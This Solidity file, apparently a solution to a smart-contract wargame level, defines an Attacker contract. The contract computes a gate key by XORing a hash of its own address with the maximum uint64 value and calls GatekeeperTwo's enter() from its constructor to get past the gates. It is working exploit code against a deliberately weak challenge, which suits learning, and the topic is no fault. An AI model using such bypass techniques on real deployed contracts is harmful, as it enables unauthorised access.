// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker {
    GatekeeperTwo gatekeeper;

    constructor(GatekeeperTwo _gatekeeper) {
        gatekeeper = _gatekeeper;
        attack();
    }

    function attack() public {
        //make _gateKey
        //require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        // a ^ b == c can also mean a ^ c == b in XOR
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 maxUint64 = type(uint64).max;

        bytes8 gatekey = bytes8(uint64(a ^ maxUint64));

        gatekeeper.enter(gatekey);
    }
}
